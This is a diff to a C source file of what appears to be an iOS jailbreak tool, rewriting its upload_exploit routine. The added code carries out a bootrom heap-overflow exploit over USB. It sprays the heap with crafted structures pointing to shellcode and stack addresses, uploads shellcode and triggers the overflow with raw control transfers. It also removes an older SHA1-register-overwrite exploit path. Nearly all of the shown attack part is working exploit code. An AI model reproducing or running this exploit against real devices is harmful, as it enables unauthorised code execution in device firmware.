@@ -267,58 +267,17 @@ int upload_firmware_payload(char* type) {
 	return 0;
 }
 
-int overwrite_sha1_registers() {
-	irecv_error_t error = 0;
-
-	debug("Resetting device counters\n");
-	error = irecv_reset_counters(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Shifting upload pointer\n");
-	if(receive_data(0x80)) {
-		error("Unable to shift upload counter\n");
-		return -1;
-	}
-
-	debug("Resetting device\n");
-	irecv_reset(client);
-
-	debug("Finishing shift transaction\n");
-	error = irecv_finish_transfer(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	debug("Overwriting SHA1 registers\n");
-	if(receive_data(0x2C000)) {
-		error("Unable to overwrite SHA1 registers\n");
-		return -1;
-	}
-	
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	return 0;
-}
-
 int upload_exploit() {
 	irecv_error_t error = 0;
-
+	unsigned int i;
+	unsigned char shellcode[0x800];
+	unsigned char buf[0x800];
+	unsigned int shellcode_address = 0x84023001;
+	unsigned int stack_address = 0x84033F98;
+	unsigned int shellcode_length = sizeof(exploit);
+	memset(shellcode, 0x0, 0x800);
+	memcpy(shellcode, exploit, sizeof(exploit));
+	
 	debug("Resetting device counters\n");
 	error = irecv_reset_counters(client);
 	if (error != IRECV_E_SUCCESS) {
@@ -326,41 +285,29 @@ int upload_exploit() {
 		return -1;
 	}
 
-	debug("Shifting upload pointer\n");
-	if(receive_data(0x140)) {
-		error("Unable to shift upload counter\n");
-		return -1;
+	memset(buf, 0xCC, 0x800);
+	for(i=0;i<0x800;i+=0x40) {
+		unsigned int* heap = (unsigned int*)(buf+i);
+		heap[0] = 0x405;
+		heap[1] = 0x101;
+		heap[2] = shellcode_address;
+		heap[3] = stack_address;
 	}
 
-	debug("Resetting device\n");
+	printf("sent data to copy: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000));
+	memset(buf, 0xCC, 0x800);
+	for(i=0;i<0x45;i++) irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+	printf("padded to 0x84023000\n");
+	printf("sent shellcode: %X has real length %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000), shellcode_length);
+	// this is the exploit part
+	memset(buf, 0xBB, 0x800);
+	printf("never freed: %X\n", irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000));
+	printf("sent fake data to timeout: %X\n", irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10));
+	printf("sent exploit to heap overflow: %X\n", irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000));
+
 	irecv_reset(client);
-
-	debug("Finishing shift transaction\n");
-	error = irecv_finish_transfer(client);
-	if (error != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(error));
-		return -1;
-	}
-
-	debug("Reconnecting to device\n");
-	client = irecv_reconnect(client, 2);
-	if (client == NULL) {
-		error("Unable to reconnect to device\n");
-		return -1;
-	}
-
-	debug("Sending exploit data\n");
-	error = irecv_send_buffer(client, (unsigned char*) exploit, sizeof(exploit), 0);
-	if(error != IRECV_E_SUCCESS) {
-		error("Unable to send exploit data\n");
-		return -1;
-	}
-
-	debug("Forcing prefetch abort exception\n");
-	if(receive_data(0x2C000)) {
-		error("Unable to force prefetch abort exception\n");
-		return -1;
-	}
+	irecv_finish_transfer(client);
+	printf("[.] exploit sent.\n");
 
 	debug("Reconnecting to device\n");
 	client = irecv_reconnect(client, 2);
@@ -762,12 +709,6 @@ void pois0n_exit() {
 int pois0n_inject() {
 	//////////////////////////////////////
 	// Send exploit
-	debug("Preparing to overwrite SHA1 registers\n");
-	if(overwrite_sha1_registers() < 0) {
-		error("Unable to overwrite SHA1 registers\n");
-		return -1;
-	}
-	
 	debug("Preparing to upload exploit data\n");
 	if(upload_exploit() < 0) {
 		error("Unable to upload exploit data\n");
